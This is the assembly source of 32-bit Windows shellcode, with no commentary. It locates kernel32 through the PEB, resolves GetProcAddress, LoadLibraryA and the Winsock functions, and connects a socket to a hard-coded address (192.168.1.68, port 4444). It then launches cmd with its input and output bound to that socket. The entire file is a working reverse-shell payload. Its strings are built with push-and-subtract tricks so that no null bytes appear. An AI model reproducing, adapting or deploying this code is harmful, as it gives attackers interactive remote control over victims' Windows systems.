[BITS 32]

global _start

section .text

_start:


XOR ECX, ECX
MOV EAX, FS:[ecx + 0x30]
MOV EAX, [EAX + 0x0c]
MOV ESI, [EAX + 0x14]
LODSD
XCHG EAX, ESI
LODSD
XCHG EAX, ESI
LODSD
MOV EBX, [EAX + 0x10]


MOV EDX, DWORD  [EBX + 0x3C]
ADD EDX, EBX
MOV EDX, DWORD  [EDX + 0x78]
ADD EDX, EBX
MOV ESI, DWORD  [EDX + 0x20]
ADD ESI, EBX
XOR ECX, ECX

GetFunction :

INC ECX
LODSD
ADD EAX, EBX
CMP dword [EAX], 0x50746547
JNZ SHORT GetFunction
CMP dword [EAX + 0x4], 0x41636F72
JNZ SHORT GetFunction
CMP dword [EAX + 0x8], 0x65726464
JNZ SHORT GetFunction

MOV ESI, DWORD [EDX + 0x24]
ADD ESI, EBX
MOV CX,  WORD [ESI + ECX * 2]
DEC ECX
MOV ESI, DWORD [EDX + 0x1C]
ADD ESI, EBX
MOV EDX, DWORD [ESI + ECX * 4]
ADD EDX, EBX


XOR ECX, ECX
PUSH EBX
PUSH EDX
PUSH ECX
PUSH 0x41797261
PUSH 0x7262694C
PUSH 0x64616F4C
PUSH ESP
PUSH EBX
MOV  ESI, EBX
CALL EDX

ADD ESP, 0xC
POP EDX
PUSH EAX
PUSH EDX
MOV DX, 0x6C6C
PUSH EDX
PUSH 0x642E3233
PUSH 0x5F327377
PUSH ESP
CALL EAX

ADD  ESP, 0x10
MOV  EDX, [ESP + 0x4]
PUSH 0x61617075
SUB  word [ESP + 0x2], 0x6161
PUSH 0x74726174
PUSH 0x53415357
PUSH ESP
PUSH EAX
MOV  EDI, EAX
CALL EDX


XOR  EBX, EBX
MOV  BX, 0x0190
SUB  ESP, EBX
PUSH ESP
PUSH EBX
CALL EAX


ADD  ESP, 0x10
XOR  EBX, EBX
ADD  BL, 0x4
IMUL EBX, 0x64
MOV  EDX, [ESP + EBX]
PUSH 0x61614174
SUB  word [ESP + 0x2], 0x6161
PUSH  0x656b636f
PUSH  0x53415357
PUSH ESP
MOV  EAX, EDI
PUSH EAX
CALL EDX
PUSH EDI


XOR ECX, ECX
PUSH EDX
PUSH EDX
PUSH EDX
MOV  DL, 0x6
PUSH EDX
INC  ECX
PUSH ECX
INC  ECX
PUSH ECX
CALL EAX
XCHG EAX, ECX


POP  EDI
ADD  ESP, 0x10
XOR  EBX, EBX
ADD  BL, 0x4
IMUL EBX, 0x63
MOV  EDX, [ESP + EBX]
PUSH 0x61746365
SUB  word [ESP + 0x3], 0x61
PUSH 0x6e6e6f63
PUSH ESP
PUSH EDI
XCHG ECX, EBP
CALL EDX


PUSH 0x4401a8c0
PUSH word 0x5c11
XOR  EBX, EBX
add  BL, 0x2
PUSH word BX
MOV  EDX, ESP
PUSH byte  16
PUSH EDX
PUSH EBP
XCHG EBP, EDI
CALL EAX


ADD  ESP, 0x14
XOR  EBX, EBX
ADD  BL, 0x4
IMUL EBX, 0x62
MOV  EDX, [ESP + EBX]
PUSH 0x61614173
SUB  dword [ESP + 0x2], 0x6161
PUSH 0x7365636f
PUSH 0x72506574
PUSH 0x61657243
PUSH ESP
MOV  EBP, ESI
PUSH EBP
CALL EDX
PUSH EAX
LEA EBP, [EAX]


PUSH 0x61646d63
SUB  word [ESP + 0x3], 0x61
MOV  ECX, ESP
XOR  EDX, EDX
SUB  ESP, 16
MOV  EBX, esp


PUSH EDI
PUSH EDI
PUSH EDI
PUSH EDX
PUSH EDX
XOR  EAX, EAX
INC  EAX
ROL  EAX, 8
PUSH EAX
PUSH EDX
PUSH EDX
PUSH EDX
PUSH EDX
PUSH EDX
PUSH EDX
PUSH EDX
PUSH EDX
PUSH EDX
PUSH EDX
XOR  EAX, EAX
ADD  AL, 44
PUSH EAX


MOV  EAX, ESP
PUSH EBX
PUSH EAX
PUSH EDX
PUSH EDX
PUSH EDX
XOR  EAX, EAX
INC  EAX
PUSH EAX
PUSH EDX
PUSH EDX
PUSH ECX
PUSH EDX
CALL EBP
